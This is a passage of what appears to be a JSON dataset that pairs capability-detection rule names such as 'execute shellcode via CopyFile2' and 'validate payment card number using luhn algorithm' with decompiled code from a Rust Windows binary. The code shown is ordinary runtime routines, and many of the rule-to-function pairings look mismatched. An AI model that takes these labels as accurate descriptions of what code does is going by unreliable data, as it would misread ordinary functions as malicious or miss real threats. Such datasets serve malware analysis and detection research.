puVar11 + 1;\n        }\n        else {\n            *arg2 = puVar11 + 2;\n            arg2[1] = puVar5 + -2;\n            uVar13 = (*(puVar11 + 1) & 0x7f) << 7;\n            unaff_RBP = uVar13;\n            uVar7 = uVar9 | uVar13;\n            if (-1 < *(puVar11 + 1)) goto code_r0x0042a1c9;\n            if (puVar5 + -2 == NULL) {\n                uVar3 = 0x13;\n                puVar11 = puVar11 + 2;\n            }\n            else {\n                *arg2 = puVar11 + 3;\n                arg2[1] = puVar5 + -3;\n                uVar1 = *(puVar11 + 2);\n                if (uVar1 < 4) {\n                    uVar7 = uVar9 | uVar13 | uVar1 << 0xe;\n                    goto code_r0x0042a1c9;\n                }\n                uVar3 = 6;\n                puVar11 = uVar1;\n            }\n        }\ncode_r0x0042b320:\n        *(arg1 + 1) = uVar3;\n        *(arg1 + 0xf) = 0;\n        *(arg1 + 0xd) = 0;\n        *(arg1 + 9) = 0;\n        arg1[2] = puVar11;\n        goto code_r0x0042aff0;\n    }\n    goto code_r0x0042a1c9;\n    while( true ) {\n        *arg2 = unaff_RBP;\n        arg2[1] = puVar11;\n        uVar1 = *(unaff_RBP + -1);\n        if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042ab59;\n        arg4 = arg4 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        ppuStack72 = ppuStack72 + 1;\n        unaff_RBP = unaff_RBP + 1;\n        if (-1 < uVar1) break;\ncode_r0x0042a8c5:\n        puVar11 = puVar11 + -1;\n        if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n    }\ncode_r0x0042a862:\n    uVar13 = arg4 >> 8 & 0xff;\n    uVar9 = arg4 >> 0x10 & 0xffff;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 0xd;\n    goto code_r0x0042b073;\n    while( true ) {\n        *arg2 = unaff_RBP;\n        arg2[1] = puVar11;\n        uVar1 = *(unaff_RBP + -1);\n        if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042ab59;\n        arg4 = arg4 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        ppuStack72 = ppuStack72 + 1;\n        unaff_RBP = unaff_RBP + 1;\n        if (-1 < uVar1) break;\ncode_r0x0042a759:\n        puVar11 = puVar11 + -1;\n        if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n    }\n    uVar13 = arg4 >> 8;\n    uVar9 = arg4 >> 0x10 & 0xffff;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 7;\n    goto code_r0x0042b073;\ncode_r0x0042ab59:\n    uVar6 = 6;\n    goto code_r0x0042ab65;\n    while( true ) {\n        *arg2 = unaff_RBP;\n        arg2[1] = puVar11;\n        uVar1 = *(unaff_RBP + -1);\n        if (((iVar10 == 0x3f) && (uVar1 != 0x7f)) && (uVar1 != 0)) {\n            uVar6 = 7;\n            goto code_r0x0042ab65;\n        }\n        uVar15 = uVar15 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        ppuStack72 = ppuStack72 + 1;\n        unaff_RBP = unaff_RBP + 1;\n        if (-1 < uVar1) break;\ncode_r0x0042a6b2:\n        puVar11 = puVar11 + -1;\n        if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n    }\n    uVar7 = -1 << (iVar10 & 0x3f);\n    if ((uVar1 & 0x40) == 0) {\n        uVar7 = 0;\n    }\n    if (0x3f < iVar10) {\n        uVar7 = 0;\n    }\n    arg4 = uVar15 | uVar7;\n    uVar13 = arg4 >> 8 & 0xff;\n    uVar9 = arg4 >> 0x10 & 0xffff;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 6;\n    goto code_r0x0042b073;\ncode_r0x0042ab60:\n    uVar6 = 0x13;\ncode_r0x0042ab65:\n    arg1[1] = uVar6;\ncode_r0x0042afec:\n    arg1[2] = ppuStack72;\n    goto code_r0x0042aff0;\ncode_r0x0042a994:\n    puVar12 = uVar1;\n    uVar6 = 6;\ncode_r0x0042b1d8:\n    arg1[1] = uVar6;\n    arg1[2] = puVar12;\n    goto code_r0x0042aff0;\n    while (unaff_RBP = unaff_RBP + 1,  ppuVar4 != unaff_RBP) {\ncode_r0x0042a520:\n        if (*(arg4 + unaff_RBP) == 0) {\n            *arg2 = arg4 + unaff_RBP;\n            arg2[1] = ppuVar4 - unaff_RBP;\n            puVar11 = arg4 + unaff_RBP;\n            if (ppuVar4 - unaff_RBP != NULL) {\n                *arg2 = arg4 + unaff_RBP + 1;\n                arg2[1] = ~unaff_RBP + ppuVar4;\n                uVar13 = arg4 >> 8;\n                uVar9 = arg4 >> 0x10 & 0xffff;\n                uVar15 = arg4 & 0xffffffff00000000;\n                uVar6 = 0x1f;\n                goto code_r0x0042b073;\n            }\n            break;\n        }\n    }\ncode_r0x0042a536:\n    arg1[1] = 0x13;\n    arg1[2] = puVar11;\ncode_r0x0042aff0:\n    uVar6 = 1;\n    goto code_r0x0042b0a1;\n    while( true ) {\n        *arg2 = arg4 + puVar5 + 1;\n        arg2[1] = puVar11 + iVar14;\n        uVar1 = *(arg4 + puVar5);\n        if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042a994;\n        unaff_RBP = unaff_RBP | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        puVar5 = puVar5 + 1;\n        iVar14 = iVar14 + -1;\n        if (-1 < uVar1) break;\ncode_r0x0042a585:\n        if (puVar11 == puVar5) goto code_r0x0042b1d0;\n    }\n    if (puVar11 - puVar5 < unaff_RBP) {\ncode_r0x0042b1d0:\n        puVar12 = arg4 + puVar5;\n        uVar6 = 0x13;\n        goto code_r0x0042b1d8;\n    }\n    *arg2 = puVar5 + unaff_RBP + arg4;\n    arg2[1] = puVar11 + (-puVar5 - unaff_RBP);\n    arg4 = arg4 + puVar5;\ncode_r0x0042a5f1:\n    uVar13 = arg4 >> 8 & 0xff;\n    uVar9 = arg4 >> 0x10 & 0xffff;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 1;\ncode_r0x0042b073:\n    arg1[1] = uVar6;\n    arg1[2] = (arg4 & 0xff | (uVar13 & 0xff) << 8 | uVar9 << 0x10) | uVar15;\n    arg1[3] = unaff_RBP;\n    *(arg1 + 4) = in_stack_00000028;\n    uVar6 = 0;\ncode_r0x0042b0a1:\n    *arg1 = uVar6;\n    return;\n}\n",
        "token_count": 10642
    },
    "c4663034": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::registry::WorkerThread::push::hc46630348a5b073a(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    char cVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    // rayon_core::registry::WorkerThread::push::hc46630348a5b073a\n    iVar1 = *(*(arg1 + 0x100) + 0x108);\n    iVar5 = *(*(arg1 + 0x100) + 0x100);\n    uVar4 = *(*(arg1 + 0x100) + 0x108);\n    iVar6 = *(arg1 + 0x110);\n    if (iVar6 <= uVar4 - *(*(arg1 + 0x100) + 0x100)) {\n        sym.crossbeam_deque::deque::Worker_T_::resize::h83bdeaa1124dc112(arg1 + 0x100, iVar6 * 2);\n        iVar6 = *(arg1 + 0x110);\n    }\n    iVar2 = *(arg1 + 0x108);\n    iVar6 = (iVar6 - 1U & uVar4) * 0x10;\n    *(iVar2 + iVar6) = arg2;\n    *(iVar2 + 8 + iVar6) = arg3;\n    *(*(arg1 + 0x100) + 0x108) = uVar4 + 1;\n    iVar6 = *(arg1 + 0x130);\n    uVar4 = sym.rayon_core::sleep::counters::AtomicCounters::increment_jobs_event_counter_if::h500436e3248af3b4\n                      (iVar6 + 0x1d0);\n    if (((uVar4 & 0xffff) != 0) &&\n       ((iVar1 != iVar5 && -1 < iVar1 - iVar5 || ((uVar4 >> 0x10 & 0xffff) == (uVar4 & 0xffff))))) {\n        iVar7 = 1;\n        iVar1 = *(iVar6 + 0x1c8);\n        iVar5 = 0;\n        do {\n            if (iVar1 == iVar5) {\n                return;\n            }\n            iVar2 = iVar5 + 1;\n            cVar3 = sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(iVar6 + 0x1a8, iVar5);\n            iVar5 = iVar2;\n        } while ((cVar3 == '\\0') || (iVar7 = iVar7 + -1,  iVar7 != 0));\n        return;\n    }\n    return;\n}\n",
        "token_count": 617
    },
    "5e1df483": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277(int64_t *arg1, uint64_t arg2)\n\n{\n    int64_t arg2_00;\n    \n    // sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277\n    sym.alloc::vec::Vec_T_A_::push::he0835cd99a235e59(arg1, arg2);\n    sym.alloc::vec::Vec_T_A_::push::he0835cd99a235e59(arg1, (arg2 & 0xffffffff) >> 8);\n    sym.alloc::vec::Vec_T_A_::push::he0835cd99a235e59(arg1, (arg2 & 0xffffffff) >> 0x10);\n    arg2_00 = arg1[2];\n    if (arg2_00 == arg1[1]) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hc9c20ce1ceee53c1(arg1, arg2_00);\n        arg2_00 = arg1[2];\n    }\n    *(*arg1 + arg2_00) = arg2 >> 0x18;\n    arg1[2] = arg2_00 + 1;\n    return;\n}\n",
        "token_count": 298
    },
    "272e8684": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid sym.core::panicking::assert_failed::h272e868455368c21(ulong arg1, ulong arg2, uint *arg3, ulong arg4)\n\n{\n    ulong uStack72;\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // core::panicking::assert_failed::h272e868455368c21\n    uStack56 = *arg3;\n    uStack52 = arg3[1];\n    uStack48 = arg3[2];\n    uStack44 = arg3[3];\n    uStack40 = arg3[4];\n    uStack36 = arg3[5];\n    uStack32 = arg3[6];\n    uStack28 = arg3[7];\n    uStack24 = arg3[8];\n    uStack20 = arg3[9];\n    uStack16 = arg3[10];\n    uStack12 = arg3[0xb];\n    uStack72 = arg1;\n    uStack64 = arg2;\n    dbg.assert_failed_inner(&uStack72, 0x4483b0, &uStack64, 0x4483b0);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 324
    },
    "2ed37ec0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_channel::waker::Waker::disconnect::h2ed37ec08bbc3a90(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    int64_t **ppiVar5;\n    int64_t **ppiVar6;\n    char *s2;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t **ppiVar10;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *apiStack104 [2];\n    int64_t iStack88;\n    ulong uStack80;\n    char *pcStack72;\n    char *pcStack64;\n    int64_t *piStack56;\n    \n    // crossbeam_channel::waker::Waker::disconnect::h2ed37ec08bbc3a90\n    iVar7 = *arg1;\n    iVar8 = iVar7 + 0x10;\n    for (iVar9 = arg1[2] * 0x18; iVar9 != 0; iVar9 = iVar9 + -0x18) {\n        LOCK();\n        puVar1 = *(iVar7 + 0x10) + 0x10;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * (*puVar1 ^ 2);\n        if (uVar2 == 0) {\n            sym.crossbeam_channel::context::Context::unpark::h2a63bb5c50780db0(iVar8);\n        }\n        iVar7 = iVar7 + 0x18;\n        iVar8 = iVar8 + 0x18;\n    }\n    piStack56 = arg1 + 3;\n    ppiVar3 = arg1[3];\n    iStack88 = arg1[5];\n    arg1[5] = 0;\n    uStack80 = 0;\n    pcStack64 = ppiVar3 + iStack88 * 3;\n    iVar8 = iStack88 * -0x18;\n    iVar7 = 0;\n    ppiVar6 = ppiVar3;\n    pcStack72 = ppiVar3;\n    do {\n        ppiVar5 = pcStack64;\n        ppiVar10 = pcStack72;\n        if (iVar8 - iVar7 == 0) {\ncode_r0x0040f91e:\n            s2 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            piStack120 = &iStack88;\n            pcStack72 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            pcStack64 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            if (ppiVar5 - ppiVar10 != 0) {\n                s2 = (ppiVar5 - ppiVar10) / 0x18;\n                sym.core::ptr::drop_in_place__crossbeam_channel::waker::Entry__::hc74945c7293ead95\n                          (((ppiVar10 - *piStack56) / 0x18) * 0x18 + *piStack56);\n            }\n            sym._ZN150__LT__LT_alloc..vec..drain..Drain_LT_T_C_A_GT__u20_as_u20_core..ops..drop..Drop_GT_..drop..DropGuard_LT_T_C_A_GT__u20_as\n                      (&piStack120, s2);\n            return;\n        }\n        ppiVar10 = ppiVar6 + 3;\n        piVar4 = ppiVar6[2];\n        if (piVar4 == NULL) {\n            ppiVar10 = ppiVar3 + (0x18 - iVar7);\n            goto code_r0x0040f91e;\n        }\n        piStack120 = *ppiVar6;\n        uStack112 = *(ppiVar6 + 1);\n        uStack108 = *(ppiVar6 + 0xc);\n        LOCK();\n        puVar1 = piVar4 + 2;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * (*puVar1 ^ piStack120);\n        apiStack104[0] = piVar4;\n        pcStack72 = ppiVar10;\n        if (uVar2 == 0) {\n            sym.crossbeam_channel::context::Context::unpark::h2a63bb5c50780db0(apiStack104);\n        }\n        sym.core::ptr::drop_in_place_crossbeam_channel::waker::Entry_::hf56abe6238347ed5(&piStack120);\n        iVar7 = iVar7 + -0x18;\n        ppiVar6 = ppiVar10;\n    } while( true );\n}\n",
        "token_count": 1203
    },
    "a66c84ed": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * sym.std::thread::Thread::new::ha66c84edb9e6189d(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    char *pcStack40;\n    ulong uStack32;\n    \n    // std::thread::Thread::new::ha66c84edb9e6189d\n    puVar5 = sym.__rust_alloc(0x30, 8);\n    uVar4 = *0x44448c;\n    uVar3 = *0x444488;\n    uVar2 = *0x444484;\n    if (puVar5 == NULL) {\n        dbg.handle_alloc_error(0x30);\n    }\n    else {\n        *puVar5 = *0x444480;\n        puVar5[1] = uVar2;\n        puVar5[2] = uVar3;\n        puVar5[3] = uVar4;\n        *(puVar5 + 4) = arg1;\n        *(puVar5 + 6) = arg2;\n        sub.KERNEL32.dll_AcquireSRWLockExclusive(0x452050);\n        iVar1 = *0x443058;\n        if (*0x443058 == -1) {\n            sub.KERNEL32.dll_ReleaseSRWLockExclusive(0x452050);\n            uStack72 = 0x449f00;\n            uStack64 = 1;\n            uStack56 = 0;\n            pcStack40 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            uStack32 = 0;\n            dbg.panic_fmt(&uStack72, 0x449f10);\n        }\n        else {\n            if (*0x443058 != 0) {\n                *0x443058 = *0x443058 + 1;\n                sub.KERNEL32.dll_ReleaseSRWLockExclusive(0x452050);\n                *(puVar5 + 8) = iVar1;\n                *(puVar5 + 10) = 0;\n                return puVar5;\n            }\n            *0x443058 = *0x443058 + 1;\n            dbg.panic(0x44bcbb, 0x2b, 0x449f28);\n        }\n    }\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 584
    },
    "de581309": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid sym._alloc::vec::Vec_T_A__as_core::ops::drop::Drop_::drop::hde581309b9f37576(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    // <alloc::vec::Vec<T,A> as core::ops::drop::Drop>::drop::hde581309b9f37576\n    iVar1 = *arg1;\n    for (iVar2 = arg1[2] * 0x88; iVar2 != 0; iVar2 = iVar2 + -0x88) {\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(iVar1 + 0x10);\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(iVar1 + 0x28);\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(iVar1 + 0x40);\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(iVar1 + 0x58);\n        iVar1 = iVar1 + 0x88;\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "ed7bdfc9": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t sym.core::iter::adapters::filter::filter_try_fold::__u7b__u7b_closure_u7d__u7d_::hed7bdfc9786469d5\n                  (int64_t **arg1, uint64_t arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    int64_t unaff_RDI;\n    ulong uStack48;\n    \n    // core::iter::adapters::filter::filter_try_fold::_$u7b$$u7b$closure$u7d$$u7d$::hed7bdfc9786469d5\n    if (*(**arg1 + 0x120) != arg2) {\n        uVar2 = (*arg1[1])[1];\n        if (uVar2 <= arg2) {\n            dbg.panic_bounds_check(arg2, uVar2, 0x4489f0);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        iVar3 = **arg1[1];\n        unaff_RDI = arg2 * 0x50;\n        uVar2 = *(*(iVar3 + 0x40 + unaff_RDI) + 0x100);\n        iVar5 = sym.crossbeam_epoch::default::HANDLE::__getit::h9143a98e54b6306a();\n        if (iVar5 == 0) {\n            sym.once_cell::sync::Lazy_T_F_::force::h568fdafcba663bad();\n            uStack48 = sym.crossbeam_epoch::collector::Collector::register::hb5d3f69dce6e9b03();\n            sym.core::ptr::drop_in_place_crossbeam_epoch::collector::LocalHandle_::h45c2ac2238b86eb3(&uStack48);\n        }\n        piVar7 = iVar3 + unaff_RDI + 0x40;\n        uStack48 = sym.crossbeam_epoch::default::pin::h365a3891add9bf07();\n        if (*(*piVar7 + 0x108) == uVar2 || *(*piVar7 + 0x108) - uVar2 < 0) {\n            sym.core::ptr::drop_in_place_crossbeam_epoch::guard::Guard_::hd880b2431d44c8fc(&uStack48);\n        }\n        else {\n            piVar6 = *(*piVar7 + 0x80) & 0xfffffffffffffff8;\n            unaff_RDI = *(*piVar6 + (piVar6[1] - 1U & uVar2) * 0x10);\n            if (*(*piVar7 + 0x80) == *(*piVar7 + 0x80)) {\n                LOCK();\n                puVar1 = *piVar7 + 0x100;\n                uVar4 = *puVar1;\n                *puVar1 = *puVar1 ^ (uVar2 == uVar4) * (*puVar1 ^ uVar2 + 1);\n                if (uVar2 == uVar4) {\n                    sym.core::ptr::drop_in_place_crossbeam_epoch::guard::Guard_::hd880b2431d44c8fc(&uStack48);\n                    return unaff_RDI;\n                }\n            }\n            sym.core::ptr::drop_in_place_crossbeam_epoch::guard::Guard_::hd880b2431d44c8fc(&uStack48);\n            *arg1[3] = 1;\n        }\n    }\n    return unaff_RDI;\n}\n",
        "token_count": 806
    },
    "72d9f662": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid sym._std::sync::poison::PoisonError_T__as_core::fmt::Debug_::fmt::h72d9f66211b13dad(ulong noname_0, int64_t arg2)\n\n{\n    int64_t iStack24;\n    uchar uStack16;\n    uchar uStack15;\n    \n    // <std::sync::poison::PoisonError<T> as core::fmt::Debug>::fmt::h72d9f66211b13dad\n    uStack16 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"PoisonError\", 0xb);\n    uStack15 = 0;\n    iStack24 = arg2;\n    dbg.finish_non_exhaustive(&iStack24);\n    return;\n}\n",
        "token_count": 177
    },
    "190fbe73": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid sym._std::sync::poison::PoisonError_T__as_core::fmt::Debug_::fmt::h190fbe73767fef6b(ulong noname_0, int64_t arg2)\n\n{\n    int64_t iStack24;\n    uchar uStack16;\n    uchar uStack15;\n    \n    // <std::sync::poison::PoisonError<T> as core::fmt::Debug>::fmt::h190fbe73767fef6b\n    uStack16 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"PoisonError\", 0xb);\n    uStack15 = 0;\n    iStack24 = arg2;\n    dbg.finish_non_exhaustive(&iStack24);\n    return;\n}\n",
        "token_count": 173
    },
    "1e360aca": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid sym._std::sync::poison::PoisonError_T__as_core::fmt::Debug_::fmt::h1e360aca96151fb3(ulong noname_0, int64_t arg2)\n\n{\n    int64_t iStack24;\n    uchar uStack16;\n    uchar uStack15;\n    \n    // <std::sync::poison::PoisonError<T> as core::fmt::Debug>::fmt::h1e360aca96151fb3\n    uStack16 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"PoisonError\", 0xb);\n    uStack15 = 0;\n    iStack24 = arg2;\n    dbg.finish_non_exhaustive(&iStack24);\n    return;\n}\n",
        "token_count": 175
    },
    "1482da07": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_deque::deque::Worker_T_::resize::__u7b__u7b_closure_u7d__u7d_::h1482da0738106299(uint64_t arg1)\n\n{\n    ulong *puStack16;\n    \n    // crossbeam_deque::deque::Worker<T>::resize::_$u7b$$u7b$closure$u7d$$u7d$::h1482da0738106299\n    puStack16 = arg1 & 0xfffffffffffffff8;\n    sym.crossbeam_deque::deque::Buffer_T_::dealloc::hd2c9e98ecc34ade2(*puStack16, puStack16[1]);\n    sym._ZN4core3ptr107drop_in_place_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Buffer_LT_rayon_core..job..JobRef_GT__GT__GT_17h7\n              (&puStack16);\n    return;\n}\n",
        "token_count": 205
    },
    "1bcb3cb6": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.alloc::sync::Arc_T_::drop_slow::h1bcb3cb6ac12d956(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    ulong auStack56 [2];\n    \n    // alloc::sync::Arc<T>::drop_slow::h1bcb3cb6ac12d956\n    iVar1 = *arg1;\n    sym._ZN4core3ptr158drop_in_place_LT_core..option..Option_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..\n              (iVar1 + 0x18);\n    *(iVar1 + 0x18) = 0;\n    auStack56[0] = 0;\n    sym._ZN4core3ptr130drop_in_place_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..any..Any_u2b_core..marke\n              (auStack56);\n    if (*(iVar1 + 0x10) != 0) {\n        dbg.decrement_num_running_threads(*(iVar1 + 0x10) + 0x10);\n        piVar2 = *(iVar1 + 0x10);\n        if (piVar2 != NULL) {\n            LOCK();\n            *piVar2 = *piVar2 + -1;\n            if (*piVar2 == 0) {\n                sym.alloc::sync::Arc_T_::drop_slow::h3fc1640c6aa8ef54(iVar1 + 0x10);\n            }\n        }\n    }\n    sym._ZN4core3ptr158drop_in_place_LT_core..option..Option_LT_core..result..Result_LT__LP__RP__C_alloc..boxed..Box_LT_dyn_u20_core..\n              (iVar1 + 0x18);\n    iVar1 = *arg1;\n    if (iVar1 != -1) {\n        LOCK();\n        piVar2 = iVar1 + 8;\n        *piVar2 = *piVar2 + -1;\n        if (*piVar2 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar1);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "a00b14a9": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid sym._std::thread::local::AccessError_as_core::fmt::Debug_::fmt::ha00b14a9eb91d058(ulong noname_0, int64_t arg2)\n\n{\n    int64_t iStack24;\n    uchar uStack16;\n    uchar uStack15;\n    \n    // <std::thread::local::AccessError as core::fmt::Debug>::fmt::ha00b14a9eb91d058\n    uStack16 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"AccessErrorlibrary\\\\std\\\\src\\\\thread\\\\local.rs\", 0xb);\n    uStack15 = 0;\n    iStack24 = arg2;\n    sym.core::fmt::builders::DebugStruct::finish::h23b21303d147094f(&iStack24);\n    return;\n}\n",
        "token_count": 193
    },
    "411536bb": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong sym._std::sys::windows::stdio::Stderr_as_std::io::Write_::write::h411536bb593eb3d2\n                (ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    // <std::sys::windows::stdio::Stderr as std::io::Write>::write::h411536bb593eb3d2\n    sym.std::sys::windows::stdio::write::h347b2bf3c3c6597f(arg1, 0xfffffff4, arg3, arg4);\n    return arg1;\n}\n",
        "token_count": 130
    },
    "5d640f77": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
